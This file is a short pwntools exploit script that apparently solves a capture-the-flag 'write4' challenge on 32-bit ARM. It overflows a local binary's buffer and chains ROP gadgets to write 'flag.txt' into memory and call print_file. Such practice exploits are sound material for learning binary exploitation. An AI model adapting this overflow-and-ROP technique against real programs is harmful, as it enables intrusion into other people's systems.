from pwn import *

context(arch='arm',bits=32,endian='little',os='linux')
pop_r3_r4_pc = 0x000105f0 # 0x000105f0 : pop {r3, r4, pc}
str_r3_to_r4 = 0x000105ec # 0x000105ec : str r3, [r4] ; pop {r3, r4, pc}
pop_r0_pc = 0x105f4 # pop {r0, pc}
print_file_plt = 0x000104bc
write_addr = 0x21024
p = process(b'./write4_armv5-hf')

print(p.recvuntil(b'> '))

buf = b'A' * 0x24

#buf += p32(pop_r0_pc)
#buf += p32(0x10648)
#buf += p32(print_file_plt)

buf += p32(pop_r3_r4_pc)
buf += b'flag' # r3
buf += p32(write_addr) # r4
buf += p32(str_r3_to_r4) # pc


buf += b'.txt' # r3
buf += p32(write_addr + 4)
buf += p32(str_r3_to_r4) # pc

buf += b'.txt' # r3 #dummy
buf += p32(write_addr + 4) # r4 #dummy
buf += p32(pop_r0_pc)

buf += p32(write_addr) # r0
buf += p32(print_file_plt)

p.sendline(buf)
p.interactive()


